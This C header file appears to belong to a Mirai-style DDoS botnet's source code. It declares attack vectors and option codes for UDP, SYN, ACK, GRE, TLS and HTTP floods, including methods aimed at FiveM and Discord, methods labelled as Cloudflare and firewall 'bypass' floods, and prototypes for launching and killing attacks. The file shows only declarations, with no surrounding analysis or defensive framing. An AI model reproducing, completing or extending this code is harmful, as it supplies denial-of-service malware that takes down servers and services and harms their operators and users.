#pragma once

#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>

#include "includes.h"
#include "protocol.h"

#define ATTACK_CONCURRENT_MAX   8

#define MAX_FDS 1000

struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};

struct attack_option {
    char *val;
    uint8_t key;
};

typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;

#define ATK_VEC_UDP        0  
#define ATK_VEC_VSE        1  
#define ATK_VEC_SYN        3  
#define ATK_VEC_ACK        4  
#define ATK_VEC_STOMP      5  
#define ATK_VEC_GREIP      6  
#define ATK_VEC_GREETH     7  
#define ATK_VEC_UDP_PLAIN  9  
#define ATK_VEC_TCP_BYPASS 10 
#define ATK_VEC_UDP_BYPASS 11 
#define ATK_VEC_STD        12 
#define ATK_VEC_LEGIT      13 
#define ATK_VEC_SOCKET     14 
#define ATK_VEC_RAKNET     15 
#define ATK_VEC_ESP        16 
#define ATK_VEC_UDPHEX     17 
#define ATK_VEC_FIVEM      18 
#define ATK_VEC_DISCORD    19 
#define ATK_VEC_HTTP       20 
#define ATK_VEC_PPS        21 
#define ATK_VEC_TLS        22 
#define ATK_VEC_TLSPLUS    23 
#define ATK_VEC_CLOUDFLARE 24 
#define ATK_VEC_NERV_L7    25 

#define ATK_OPT_PAYLOAD_SIZE    0   
#define ATK_OPT_PAYLOAD_RAND    1   
#define ATK_OPT_IP_TOS          2   
#define ATK_OPT_IP_IDENT        3   
#define ATK_OPT_IP_TTL          4   
#define ATK_OPT_IP_DF           5   
#define ATK_OPT_SPORT           6   
#define ATK_OPT_DPORT           7   
#define ATK_OPT_DOMAIN          8   
#define ATK_OPT_DNS_HDR_ID      9   

#define ATK_OPT_URG             11  
#define ATK_OPT_ACK             12  
#define ATK_OPT_PSH             13  
#define ATK_OPT_RST             14  
#define ATK_OPT_SYN             15  
#define ATK_OPT_FIN             16  
#define ATK_OPT_SEQRND          17  
#define ATK_OPT_ACKRND          18  
#define ATK_OPT_GRE_CONSTIP     19  
#define ATK_OPT_SOURCE          25  
#define ATK_OPT_RAND_LEN        26  
#define ATK_OPT_URL             27  
#define ATK_OPT_HTTP_PATH       28  
#define ATK_OPT_USERAGENT       29  
#define ATK_OPT_HTTPS           30  
#define ATK_OPT_COOKIES         31  

struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};

struct attack_stomp_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};

BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);


void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_raknet(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_legit(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_socket(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_gre_ip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_gre_eth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_app_proxy(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_esp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_hex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_fivem(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_discord(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_pps(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tls(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tlsplus(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_cloudflare(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_nerv_l7(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
